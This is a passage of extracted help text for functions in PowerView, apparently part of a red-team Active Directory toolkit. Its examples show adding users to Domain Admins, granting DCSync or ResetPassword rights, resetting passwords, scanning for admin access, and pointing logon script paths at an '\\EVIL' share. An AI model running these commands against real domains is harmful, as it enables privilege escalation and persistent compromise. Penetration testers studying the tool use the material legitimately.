                   '$SecPassword)\n'
                   "$UserPassword = ConvertTo-SecureString 'Password123!' "
                   '-AsPlainText -Force\n'
                   'New-DomainUser -SamAccountName andy -AccountPassword '
                   '$UserPassword -Credential $Cred | Add-DomainGroupMember '
                   "'Domain Admins' -Credential $Cred\n"
                   '\n'
                   "Creates the 'andy' user with the specified description and "
                   'password, using the specified\n'
                   "alternate credentials, and adds the user to 'domain "
                   "admins' using Add-DomainGroupMember\n"
                   'and the alternate credentials.\n'
                   '\n'
                   '.OUTPUTS\n'
                   '\n'
                   'DirectoryServices.AccountManagement.UserPrincipal\n'
                   '\n'
                   '.LINK\n'
                   '\n'
                   'http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/\n',
 'New-InMemoryModule': '.SYNOPSIS\n'
                       '\n'
                       'Creates an in-memory assembly and module\n'
                       '\n'
                       'Author: Matthew Graeber (@mattifestation)\n'
                       'License: BSD 3-Clause\n'
                       'Required Dependencies: None\n'
                       'Optional Dependencies: None\n'
                       '\n'
                       '.DESCRIPTION\n'
                       '\n'
                       'When defining custom enums, structs, and unmanaged '
                       'functions, it is\n'
                       'necessary to associate to an assembly module. This '
                       'helper function\n'
                       'creates an in-memory module that can be passed to the '
                       "'enum',\n"
                       "'struct', and Add-Win32Type functions.\n"
                       '\n'
                       '.PARAMETER ModuleName\n'
                       '\n'
                       'Specifies the desired name for the in-memory assembly '
                       'and module. If\n'
                       'ModuleName is not provided, it will default to a '
                       'GUID.\n'
                       '\n'
                       '.EXAMPLE\n'
                       '\n'
                       '$Module = New-InMemoryModule -ModuleName Win32\n',
 'Remove-DomainGroupMember': '.SYNOPSIS\n'
                             '\n'
                             'Removes a domain user (or group) from an '
                             'existing domain group, assuming\n'
                             'appropriate permissions to do so.\n'
                             '\n'
                             'Author: Will Schroeder (@harmj0y)  \n'
                             'License: BSD 3-Clause  \n'
                             'Required Dependencies: Get-PrincipalContext  \n'
                             '\n'
                             '.DESCRIPTION\n'
                             '\n'
                             'First binds to the specified domain context '
                             'using Get-PrincipalContext.\n'
                             'The bound domain context is then used to search '
                             'for the specified -GroupIdentity,\n'
                             'which returns a '
                             'DirectoryServices.AccountManagement.GroupPrincipal '
                             'object. For\n'
                             'each entry in -Members, each member identity is '
                             'similarly searched for and removed\n'
                             'from the group.\n'
                             '\n'
                             '.PARAMETER Identity\n'
                             '\n'
                             'A group SamAccountName (e.g. Group1), '
                             'DistinguishedName (e.g. '
                             'CN=group1,CN=Users,DC=testlab,DC=local),\n'
                             'SID (e.g. '
                             'S-1-5-21-890171859-3433809279-3366196753-1114), '
                             'or GUID (e.g. '
                             '4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)\n'
                             'specifying the group to remove members from.\n'
                             '\n'
                             '.PARAMETER Members\n'
                             '\n'
                             'One or more member identities, i.e. '
                             'SamAccountName (e.g. Group1), DistinguishedName\n'
                             '(e.g. CN=group1,CN=Users,DC=testlab,DC=local), '
                             'SID (e.g. '
                             'S-1-5-21-890171859-3433809279-3366196753-1114),\n'
                             'or GUID (e.g. '
                             '4c435dd7-dc58-4b14-9a5e-1fdb0e80d202).\n'
                             '\n'
                             '.PARAMETER Domain\n'
                             '\n'
                             'Specifies the domain to use to search for '
                             'user/group principals, defaults to the current '
                             'domain.\n'
                             '\n'
                             '.PARAMETER Credential\n'
                             '\n'
                             'A [Management.Automation.PSCredential] object of '
                             'alternate credentials\n'
                             'for connection to the target domain.\n'
                             '\n'
                             '.EXAMPLE\n'
                             '\n'
                             "Remove-DomainGroupMember -Identity 'Domain "
                             "Admins' -Members 'harmj0y'\n"
                             '\n'
                             "Removes harmj0y from 'Domain Admins' in the "
                             'current domain.\n'
                             '\n'
                             '.EXAMPLE\n'
                             '\n'
                             '$SecPassword = ConvertTo-SecureString '
                             "'Password123!' -AsPlainText -Force\n"
                             '$Cred = New-Object '
                             "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                             '$SecPassword)\n'
                             "Remove-DomainGroupMember -Identity 'Domain "
                             "Admins' -Members 'harmj0y' -Credential $Cred\n"
                             '\n'
                             "Removes harmj0y from 'Domain Admins' in the "
                             'current domain using the alternate credentials.\n'
                             '\n'
                             '.LINK\n'
                             '\n'
                             'http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/\n',
 'Remove-DomainObjectAcl': '.SYNOPSIS\n'
                           '\n'
                           'Removes an ACL from a specific active directory '
                           'object.\n'
                           '\n'
                           'Author: Will Schroeder (@harmj0y)  \n'
                           'License: BSD 3-Clause  \n'
                           'Required Dependencies: Get-DomainObject  \n'
                           '\n'
                           '.DESCRIPTION\n'
                           '\n'
                           'This function modifies the ACL/ACE entries for a '
                           'given Active Directory\n'
                           'target object specified by -TargetIdentity. '
                           'Available -Rights are\n'
                           "'All', 'ResetPassword', 'WriteMembers', 'DCSync', "
                           'or a manual extended\n'
                           'rights GUID can be set with -RightsGUID. These '
                           'rights are removed from the target\n'
                           'object for the specified -PrincipalIdentity.\n'
                           '\n'
                           '.PARAMETER TargetIdentity\n'
                           '\n'
                           'A SamAccountName (e.g. harmj0y), DistinguishedName '
                           '(e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\n'
                           'SID (e.g. '
                           'S-1-5-21-890171859-3433809279-3366196753-1108), or '
                           'GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\n'
                           'for the domain object to modify ACLs for. '
                           'Required. Wildcards accepted.\n'
                           '\n'
                           '.PARAMETER TargetDomain\n'
                           '\n'
                           'Specifies the domain for the TargetIdentity to use '
                           'for the modification, defaults to the current '
                           'domain.\n'
                           '\n'
                           '.PARAMETER TargetLDAPFilter\n'
                           '\n'
                           'Specifies an LDAP query string that is used to '
                           'filter Active Directory object targets.\n'
                           '\n'
                           '.PARAMETER TargetSearchBase\n'
                           '\n'
                           'The LDAP source to search through for targets, '
                           'e.g. "LDAP://OU=secret,DC=testlab,DC=local"\n'
                           'Useful for OU queries.\n'
                           '\n'
                           '.PARAMETER PrincipalIdentity\n'
                           '\n'
                           'A SamAccountName (e.g. harmj0y), DistinguishedName '
                           '(e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\n'
                           'SID (e.g. '
                           'S-1-5-21-890171859-3433809279-3366196753-1108), or '
                           'GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\n'
                           'for the domain principal to add for the ACL. '
                           'Required. Wildcards accepted.\n'
                           '\n'
                           '.PARAMETER PrincipalDomain\n'
                           '\n'
                           'Specifies the domain for the TargetIdentity to use '
                           'for the principal, defaults to the current '
                           'domain.\n'
                           '\n'
                           '.PARAMETER Server\n'
                           '\n'
                           'Specifies an Active Directory server (domain '
                           'controller) to bind to.\n'
                           '\n'
                           '.PARAMETER SearchScope\n'
                           '\n'
                           'Specifies the scope to search under, '
                           'Base/OneLevel/Subtree (default of Subtree).\n'
                           '\n'
                           '.PARAMETER ResultPageSize\n'
                           '\n'
                           'Specifies the PageSize to set for the LDAP '
                           'searcher object.\n'
                           '\n'
                           '.PARAMETER ServerTimeLimit\n'
                           '\n'
                           'Specifies the maximum amount of time the server '
                           'spends searching. Default of 120 seconds.\n'
                           '\n'
                           '.PARAMETER Tombstone\n'
                           '\n'
                           'Switch. Specifies that the searcher should also '
                           'return deleted/tombstoned objects.\n'
                           '\n'
                           '.PARAMETER Credential\n'
                           '\n'
                           'A [Management.Automation.PSCredential] object of '
                           'alternate credentials\n'
                           'for connection to the target domain.\n'
                           '\n'
                           '.PARAMETER Rights\n'
                           '\n'
                           "Rights to add for the principal, 'All', "
                           "'ResetPassword', 'WriteMembers', 'DCSync'.\n"
                           "Defaults to 'All'.\n"
                           '\n'
                           '.PARAMETER RightsGUID\n'
                           '\n'
                           'Manual GUID representing the right to add to the '
                           'target.\n'
                           '\n'
                           '.EXAMPLE\n'
                           '\n'
                           '$UserSID = Get-DomainUser user | Select-Object '
                           '-ExpandProperty objectsid\n'
                           'Get-DomainObjectACL user2 -ResolveGUIDs | '
                           'Where-Object {$_.securityidentifier -eq $UserSID}\n'
                           '\n'
                           '[no results returned]\n'
                           '\n'
                           'Add-DomainObjectAcl -TargetIdentity user2 '
                           '-PrincipalIdentity user -Rights ResetPassword\n'
                           '\n'
                           'Get-DomainObjectACL user2 -ResolveGUIDs | '
                           'Where-Object {$_.securityidentifier -eq $UserSID '
                           '}\n'
                           '\n'
                           'AceQualifier           : AccessAllowed\n'
                           'ObjectDN               : '
                           'CN=user2,CN=Users,DC=testlab,DC=local\n'
                           'ActiveDirectoryRights  : ExtendedRight\n'
                           'ObjectAceType          : '
                           'User-Force-Change-Password\n'
                           'ObjectSID              : '
                           'S-1-5-21-883232822-274137685-4173207997-2105\n'
                           'InheritanceFlags       : None\n'
                           'BinaryLength           : 56\n'
                           'AceType                : AccessAllowedObject\n'
                           'ObjectAceFlags         : ObjectAceTypePresent\n'
                           'IsCallback             : False\n'
                           'PropagationFlags       : None\n'
                           'SecurityIdentifier     : '
                           'S-1-5-21-883232822-274137685-4173207997-2104\n'
                           'AccessMask             : 256\n'
                           'AuditFlags             : None\n'
                           'IsInherited            : False\n'
                           'AceFlags               : None\n'
                           'InheritedObjectAceType : All\n'
                           'OpaqueLength           : 0\n'
                           '\n'
                           '\n'
                           'Remove-DomainObjectAcl -TargetIdentity user2 '
                           '-PrincipalIdentity user -Rights ResetPassword\n'
                           '\n'
                           'Get-DomainObjectACL user2 -ResolveGUIDs | '
                           'Where-Object {$_.securityidentifier -eq $UserSID}\n'
                           '\n'
                           '[no results returned]\n'
                           '\n'
                           '.LINK\n'
                           '\n'
                           'https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell\n',
 'Remove-RemoteConnection': '.SYNOPSIS\n'
                            '\n'
                            'Destroys a connection created by '
                            'New-RemoteConnection.\n'
                            '\n'
                            'Author: Will Schroeder (@harmj0y)  \n'
                            'License: BSD 3-Clause  \n'
                            'Required Dependencies: PSReflect  \n'
                            '\n'
                            '.DESCRIPTION\n'
                            '\n'
                            'This function uses WNetCancelConnection2 to '
                            'destroy a connection created by\n'
                            "New-RemoteConnection. If a -Path isn't specified, "
                            'a -ComputerName is required to\n'
                            "'unmount' \\\\$ComputerName\\IPC$.\n"
                            '\n'
                            '.PARAMETER ComputerName\n'
                            '\n'
                            'Specifies the system to remove a '
                            '\\\\ComputerName\\IPC$ connection for.\n'
                            '\n'
                            '.PARAMETER Path\n'
                            '\n'
                            'Specifies the remote \\\\UNC\\path to remove the '
                            'connection for.\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            'Remove-RemoteConnection -ComputerName '
                            "'PRIMARY.testlab.local'\n"
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            'Remove-RemoteConnection -Path '
                            "'\\\\PRIMARY.testlab.local\\C$\\'\n"
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            "@('PRIMARY.testlab.local','SECONDARY.testlab.local') "
                            '| Remove-RemoteConnection\n',
 'Resolve-IPAddress': '.SYNOPSIS\n'
                      '\n'
                      'Resolves a given hostename to its associated IPv4 '
                      'address.\n'
                      '\n'
                      'Author: Will Schroeder (@harmj0y)  \n'
                      'License: BSD 3-Clause  \n'
                      'Required Dependencies: None  \n'
                      '\n'
                      '.DESCRIPTION\n'
                      '\n'
                      'Resolves a given hostename to its associated IPv4 '
                      'address using\n'
                      '[Net.Dns]::GetHostEntry(). If no hostname is provided, '
                      'the default\n'
                      'is the IP address of the localhost.\n'
                      '\n'
                      '.EXAMPLE\n'
                      '\n'
                      'Resolve-IPAddress -ComputerName SERVER\n'
                      '\n'
                      '.EXAMPLE\n'
                      '\n'
                      '@("SERVER1", "SERVER2") | Resolve-IPAddress\n'
                      '\n'
                      '.INPUTS\n'
                      '\n'
                      'String\n'
                      '\n'
                      'Accepts one or more IP address strings on the '
                      'pipeline.\n'
                      '\n'
                      '.OUTPUTS\n'
                      '\n'
                      'System.Management.Automation.PSCustomObject\n'
                      '\n'
                      'A custom PSObject with the ComputerName and '
                      'IPAddress.\n',
 'Set-DomainObject': '.SYNOPSIS\n'
                     '\n'
                     'Modifies a gven property for a specified active '
                     'directory object.\n'
                     '\n'
                     'Author: Will Schroeder (@harmj0y)  \n'
                     'License: BSD 3-Clause  \n'
                     'Required Dependencies: Get-DomainObject  \n'
                     '\n'
                     '.DESCRIPTION\n'
                     '\n'
                     'Splats user/object targeting parameters to '
                     'Get-DomainObject, returning the raw\n'
                     'searchresult object. Retrieves the raw directoryentry '
                     'for the object, and sets\n'
                     'any values from -Set @{}, XORs any values from -XOR @{}, '
                     'and clears any values\n'
                     'from -Clear @().\n'
                     '\n'
                     '.PARAMETER Identity\n'
                     '\n'
                     'A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. '
                     'CN=harmj0y,CN=Users,DC=testlab,DC=local),\n'
                     'SID (e.g. '
                     'S-1-5-21-890171859-3433809279-3366196753-1108), or GUID '
                     '(e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).\n'
                     'Wildcards accepted.\n'
                     '\n'
                     '.PARAMETER Set\n'
                     '\n'
                     'Specifies values for one or more object properties (in '
                     'the form of a hashtable) that will replace the current '
                     'values.\n'
                     '\n'
                     '.PARAMETER XOR\n'
                     '\n'
                     'Specifies values for one or more object properties (in '
                     'the form of a hashtable) that will XOR the current '
                     'values.\n'
                     '\n'
                     '.PARAMETER Clear\n'
                     '\n'
                     'Specifies an array of object properties that will be '
                     'cleared in the directory.\n'
                     '\n'
                     '.PARAMETER Domain\n'
                     '\n'
                     'Specifies the domain to use for the query, defaults to '
                     'the current domain.\n'
                     '\n'
                     '.PARAMETER LDAPFilter\n'
                     '\n'
                     'Specifies an LDAP query string that is used to filter '
                     'Active Directory objects.\n'
                     '\n'
                     '.PARAMETER SearchBase\n'
                     '\n'
                     'The LDAP source to search through, e.g. '
                     '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                     'Useful for OU queries.\n'
                     '\n'
                     '.PARAMETER Server\n'
                     '\n'
                     'Specifies an Active Directory server (domain controller) '
                     'to bind to.\n'
                     '\n'
                     '.PARAMETER SearchScope\n'
                     '\n'
                     'Specifies the scope to search under, '
                     'Base/OneLevel/Subtree (default of Subtree).\n'
                     '\n'
                     '.PARAMETER ResultPageSize\n'
                     '\n'
                     'Specifies the PageSize to set for the LDAP searcher '
                     'object.\n'
                     '\n'
                     '.PARAMETER ServerTimeLimit\n'
                     '\n'
                     'Specifies the maximum amount of time the server spends '
                     'searching. Default of 120 seconds.\n'
                     '\n'
                     '.PARAMETER Tombstone\n'
                     '\n'
                     'Switch. Specifies that the searcher should also return '
                     'deleted/tombstoned objects.\n'
                     '\n'
                     '.PARAMETER Credential\n'
                     '\n'
                     'A [Management.Automation.PSCredential] object of '
                     'alternate credentials\n'
                     'for connection to the target domain.\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     'Set-DomainObject testuser -Set '
                     "@{'mstsinitialprogram'='\\\\EVIL\\program.exe'} "
                     '-Verbose\n'
                     '\n'
                     'VERBOSE: Get-DomainSearcher search string: '
                     'LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\n'
                     'VERBOSE: Get-DomainObject filter string: '
                     '(&(|(samAccountName=testuser)))\n'
                     'VERBOSE: Setting mstsinitialprogram to '
                     '\\\\EVIL\\program.exe for object testuser\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     '"S-1-5-21-890171859-3433809279-3366196753-1108","testuser" '
                     "| Set-DomainObject -Set @{'countrycode'=1234; "
                     "'mstsinitialprogram'='\\\\EVIL\\program2.exe'} -Verbose\n"
                     '\n'
                     'VERBOSE: Get-DomainSearcher search string: '
                     'LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\n'
                     'VERBOSE: Get-DomainObject filter string:\n'
                     '(&(|(objectsid=S-1-5-21-890171859-3433809279-3366196753-1108)))\n'
                     'VERBOSE: Setting mstsinitialprogram to '
                     '\\\\EVIL\\program2.exe for object harmj0y\n'
                     'VERBOSE: Setting countrycode to 1234 for object harmj0y\n'
                     'VERBOSE: Get-DomainSearcher search string:\n'
                     'LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\n'
                     'VERBOSE: Get-DomainObject filter string: '
                     '(&(|(samAccountName=testuser)))\n'
                     'VERBOSE: Setting mstsinitialprogram to '
                     '\\\\EVIL\\program2.exe for object testuser\n'
                     'VERBOSE: Setting countrycode to 1234 for object '
                     'testuser\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     '"S-1-5-21-890171859-3433809279-3366196753-1108","testuser" '
                     '| Set-DomainObject -Clear department -Verbose\n'
                     '\n'
                     "Cleares the 'department' field for both object "
                     'identities.\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     'Get-DomainUser testuser | ConvertFrom-UACValue -Verbose\n'
                     '\n'
                     'Name                           Value\n'
                     '----                           -----\n'
                     'NORMAL_ACCOUNT                 512\n'
                     '\n'
                     '\n'
                     'Set-DomainObject -Identity testuser -XOR '
                     '@{useraccountcontrol=65536} -Verbose\n'
                     '\n'
                     'VERBOSE: Get-DomainSearcher search string: '
                     'LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\n'
                     'VERBOSE: Get-DomainObject filter string: '
                     '(&(|(samAccountName=testuser)))\n'
                     "VERBOSE: XORing 'useraccountcontrol' with '65536' for "
                     "object 'testuser'\n"
                     '\n'
                     'Get-DomainUser testuser | ConvertFrom-UACValue -Verbose\n'
                     '\n'
                     'Name                           Value\n'
                     '----                           -----\n'
                     'NORMAL_ACCOUNT                 512\n'
                     'DONT_EXPIRE_PASSWORD           65536\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     'Get-DomainUser -Identity testuser -Properties '
                     'scriptpath\n'
                     '\n'
                     'scriptpath\n'
                     '----------\n'
                     '\\\\primary\\sysvol\\blah.ps1\n'
                     '\n'
                     '$SecPassword = ConvertTo-SecureString '
                     "'Password123!'-AsPlainText -Force\n"
                     '$Cred = New-Object '
                     "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                     '$SecPassword)\n'
                     'Set-DomainObject -Identity testuser -Set '
                     "@{'scriptpath'='\\\\EVIL\\program2.exe'} -Credential "
                     '$Cred -Verbose\n'
                     'VERBOSE: [Get-Domain] Using alternate credentials for '
                     'Get-Domain\n'
                     "VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from "
                     '-Credential\n'
                     'VERBOSE: [Get-DomainSearcher] search string: '
                     'LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\n'
                     'VERBOSE: [Get-DomainSearcher] Using alternate '
                     'credentials for LDAP connection\n'
                     'VERBOSE: [Get-DomainObject] Get-DomainObject filter '
                     'string: '
                     '(&(|(|(samAccountName=testuser)(name=testuser))))\n'
                     "VERBOSE: [Set-DomainObject] Setting 'scriptpath' to "
                     "'\\\\EVIL\\program2.exe' for object 'testuser'\n"
                     '\n'
                     'Get-DomainUser -Identity testuser -Properties '
                     'scriptpath\n'
                     '\n'
                     'scriptpath\n'
                     '----------\n'
                     '\\\\EVIL\\program2.exe\n',
 'Set-DomainObjectOwner': '.SYNOPSIS\n'
                          '\n'
                          'Modifies the owner for a specified active directory '
                          'object.\n'
                          '\n'
                          'Author: Will Schroeder (@harmj0y)  \n'
                          'License: BSD 3-Clause  \n'
                          'Required Dependencies: Get-DomainObject  \n'
                          '\n'
                          '.DESCRIPTION\n'
                          '\n'
                          'Retrieves the Active Directory object specified by '
                          '-Identity by splatting to\n'
                          'Get-DomainObject, returning the raw searchresult '
                          'object. Retrieves the raw\n'
                          'directoryentry for the object, and sets the object '
                          'owner to -OwnerIdentity.\n'
                          '\n'
                          '.PARAMETER Identity\n'
                          '\n'
                          'A SamAccountName (e.g. harmj0y), DistinguishedName '
                          '(e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\n'
                          'SID (e.g. '
                          'S-1-5-21-890171859-3433809279-3366196753-1108), or '
                          'GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\n'
                          'of the AD object to set the owner for.\n'
                          '\n'
                          '.PARAMETER OwnerIdentity\n'
                          '\n'
                          'A SamAccountName (e.g. harmj0y), DistinguishedName '
                          '(e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\n'
                          'SID (e.g. '
                          'S-1-5-21-890171859-3433809279-3366196753-1108), or '
                          'GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\n'
                          'of the owner to set for -Identity.\n'
                          '\n'
                          '.PARAMETER Domain\n'
                          '\n'
                          'Specifies the domain to use for the query, defaults '
                          'to the current domain.\n'
                          '\n'
                          '.PARAMETER LDAPFilter\n'
                          '\n'
                          'Specifies an LDAP query string that is used to '
                          'filter Active Directory objects.\n'
                          '\n'
                          '.PARAMETER SearchBase\n'
                          '\n'
                          'The LDAP source to search through, e.g. '
                          '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                          'Useful for OU queries.\n'
                          '\n'
                          '.PARAMETER Server\n'
                          '\n'
                          'Specifies an Active Directory server (domain '
                          'controller) to bind to.\n'
                          '\n'
                          '.PARAMETER SearchScope\n'
                          '\n'
                          'Specifies the scope to search under, '
                          'Base/OneLevel/Subtree (default of Subtree).\n'
                          '\n'
                          '.PARAMETER ResultPageSize\n'
                          '\n'
                          'Specifies the PageSize to set for the LDAP searcher '
                          'object.\n'
                          '\n'
                          '.PARAMETER ServerTimeLimit\n'
                          '\n'
                          'Specifies the maximum amount of time the server '
                          'spends searching. Default of 120 seconds.\n'
                          '\n'
                          '.PARAMETER Tombstone\n'
                          '\n'
                          'Switch. Specifies that the searcher should also '
                          'return deleted/tombstoned objects.\n'
                          '\n'
                          '.PARAMETER Credential\n'
                          '\n'
                          'A [Management.Automation.PSCredential] object of '
                          'alternate credentials\n'
                          'for connection to the target domain.\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          'Set-DomainObjectOwner -Identity dfm -OwnerIdentity '
                          'harmj0y\n'
                          '\n'
                          "Set the owner of 'dfm' in the current domain to "
                          "'harmj0y'.\n"
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          '$SecPassword = ConvertTo-SecureString '
                          "'Password123!' -AsPlainText -Force\n"
                          '$Cred = New-Object '
                          "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                          '$SecPassword)\n'
                          'Set-DomainObjectOwner -Identity dfm -OwnerIdentity '
                          'harmj0y -Credential $Cred\n'
                          '\n'
                          "Set the owner of 'dfm' in the current domain to "
                          "'harmj0y' using the alternate credentials.\n",
 'Set-DomainUserPassword': '.SYNOPSIS\n'
                           '\n'
                           'Sets the password for a given user identity.\n'
                           '\n'
                           'Author: Will Schroeder (@harmj0y)  \n'
                           'License: BSD 3-Clause  \n'
                           'Required Dependencies: Get-PrincipalContext  \n'
                           '\n'
                           '.DESCRIPTION\n'
                           '\n'
                           'First binds to the specified domain context using '
                           'Get-PrincipalContext.\n'
                           'The bound domain context is then used to search '
                           'for the specified user -Identity,\n'
                           'which returns a '
                           'DirectoryServices.AccountManagement.UserPrincipal '
                           'object. The\n'
                           'SetPassword() function is then invoked on the '
                           'user, setting the password to -AccountPassword.\n'
                           '\n'
                           '.PARAMETER Identity\n'
                           '\n'
                           'A user SamAccountName (e.g. User1), '
                           'DistinguishedName (e.g. '
                           'CN=user1,CN=Users,DC=testlab,DC=local),\n'
                           'SID (e.g. '
                           'S-1-5-21-890171859-3433809279-3366196753-1113), or '
                           'GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\n'
                           'specifying the user to reset the password for.\n'
                           '\n'
                           '.PARAMETER AccountPassword\n'
                           '\n'
                           "Specifies the password to reset the target user's "
                           'to. Mandatory.\n'
                           '\n'
                           '.PARAMETER Domain\n'
                           '\n'
                           'Specifies the domain to use to search for the user '
                           'identity, defaults to the current domain.\n'
                           '\n'
                           '.PARAMETER Credential\n'
                           '\n'
                           'A [Management.Automation.PSCredential] object of '
                           'alternate credentials\n'
                           'for connection to the target domain.\n'
                           '\n'
                           '.EXAMPLE\n'
                           '\n'
                           '$UserPassword = ConvertTo-SecureString '
                           "'Password123!' -AsPlainText -Force\n"
                           'Set-DomainUserPassword -Identity andy '
                           '-AccountPassword $UserPassword\n'
                           '\n'
                           "Resets the password for 'andy' to the password "
                           'specified.\n'
                           '\n'
                           '.EXAMPLE\n'
                           '\n'
                           '$SecPassword = ConvertTo-SecureString '
                           "'Password123!' -AsPlainText -Force\n"
                           '$Cred = New-Object '
                           "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                           '$SecPassword)\n'
                           '$UserPassword = ConvertTo-SecureString '
                           "'Password123!' -AsPlainText -Force\n"
                           'Set-DomainUserPassword -Identity andy '
                           '-AccountPassword $UserPassword -Credential $Cred\n'
                           '\n'
                           "Resets the password for 'andy' usering the "
                           'alternate credentials specified.\n'
                           '\n'
                           '.OUTPUTS\n'
                           '\n'
                           'DirectoryServices.AccountManagement.UserPrincipal\n'
                           '\n'
                           '.LINK\n'
                           '\n'
                           'http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/\n',
 'Test-AdminAccess': '.SYNOPSIS\n'
                     '\n'
                     'Tests if the current user has administrative access to '
                     'the local (or a remote) machine.\n'
                     '\n'
                     'Idea stolen from the local_admin_search_enum post module '
                     'in Metasploit written by:  \n'
                     '    \'Brandon McCann "zeknox" '
                     "<bmccann[at]accuvant.com>'  \n"
                     '    \'Thomas McCarthy "smilingraccoon" '
                     "<smilingraccoon[at]gmail.com>'  \n"
                     '    \'Royce Davis "r3dy" <rdavis[at]accuvant.com>\'  \n'
                     '\n'
                     'Author: Will Schroeder (@harmj0y)  \n'
                     'License: BSD 3-Clause  \n'
                     'Required Dependencies: PSReflect, '
                     'Invoke-UserImpersonation, Invoke-RevertToSelf  \n'
                     '\n'
                     '.DESCRIPTION\n'
                     '\n'
                     'This function will use the OpenSCManagerW Win32API call '
                     'to establish\n'
                     'a handle to the remote host. If this succeeds, the '
                     'current user context\n'
                     'has local administrator acess to the target.\n'
                     '\n'
                     '.PARAMETER ComputerName\n'
                     '\n'
                     'Specifies the hostname to check for local admin access '
                     '(also accepts IP addresses).\n'
                     "Defaults to 'localhost'.\n"
                     '\n'
                     '.PARAMETER Credential\n'
                     '\n'
                     'A [Management.Automation.PSCredential] object of '
                     'alternate credentials\n'
                     'for connection to the remote system using '
                     'Invoke-UserImpersonation.\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     'Test-AdminAccess -ComputerName sqlserver\n'
                     '\n'
                     'Returns results indicating whether the current user has '
                     "admin access to the 'sqlserver' host.\n"
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     'Get-DomainComputer | Test-AdminAccess\n'
                     '\n'
                     'Returns what machines in the domain the current user has '
                     'access to.\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     "$SecPassword = ConvertTo-SecureString 'Password123!' "
                     '-AsPlainText -Force\n'
                     '$Cred = New-Object '
                     "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                     '$SecPassword)\n'
                     'Test-AdminAccess -ComputerName sqlserver -Credential '
                     '$Cred\n'
                     '\n'
                     '.OUTPUTS\n'
                     '\n'
                     'PowerView.AdminAccess\n'
                     '\n'
                     'A PSCustomObject containing the ComputerName and '
                     "'IsAdmin' set to whether\n"
                     'the current user has local admin rights, along with the '
                     'ComputerName added.\n'
                     '\n'
                     '.LINK\n'
                     '\n'
                     'https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb\n'
                     'http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/\n',
 'field': '    Param (\n'
          '        [Parameter(Position = 0, Mandatory=$True)]\n'
          '        [UInt16]\n'
          '        $Position,\n'
          '\n'
          '        [Parameter(Position = 1, Mandatory=$True)]\n'
          '        [Type]\n'
          '        $Type,\n'
          '\n'
          '        [Parameter(Position = 2)]\n'
          '        [UInt16]\n'
          '        $Offset,\n'
          '\n'
          '        [Object[]]\n'
          '        $MarshalAs\n'
          '    )\n'
          '\n'
          '    @{\n'
          '        Position = $Position\n'
          '        Type = $Type -as [Type]\n'
          '        Offset = $Offset\n'
          '        MarshalAs = $MarshalAs\n'
          '    }\n'
          '}\n'
          '\n'
          '\n'
          'function struct\n'
          '{\n'
          '.SYNOPSIS\n'
          '\n'
          'Creates an in-memory struct for use in your PowerShell session.\n'
          '\n'
          'Author: Matthew Graeber (@mattifestation)\n'
          'License: BSD 3-Clause\n'
          'Required Dependencies: None\n'
          'Optional Dependencies: field\n'
          '\n'
          '.DESCRIPTION\n'
          '\n'
          "The 'struct' function facilitates the creation of structs entirely "
          'in\n'
          'memory using as close to a "C style" as PowerShell will allow. '
          'Struct\n'
          'fields are specified using a hashtable where each field of the '
          'struct\n'
          'is comprosed of the order in which it should be defined, its .NET\n'
          'type, and optionally, its offset and special marshaling '
          'attributes.\n'
          '\n'
          "One of the features of 'struct' is that after your struct is "
          'defined,\n'
          'it will come with a built-in GetSize method as well as an explicit\n'
          'converter so that you can easily cast an IntPtr to the struct '
          'without\n'
          'relying upon calling SizeOf and/or PtrToStructure in the Marshal\n'
          'class.\n'
          '\n'
          '.PARAMETER Module\n'
          '\n'
          'The in-memory module that will host the struct. Use\n'
          'New-InMemoryModule to define an in-memory module.\n'
          '\n'
          '.PARAMETER FullName\n'
          '\n'
          'The fully-qualified name of the struct.\n'
          '\n'
          '.PARAMETER StructFields\n'
          '\n'
          "A hashtable of fields. Use the 'field' helper function to ease\n"
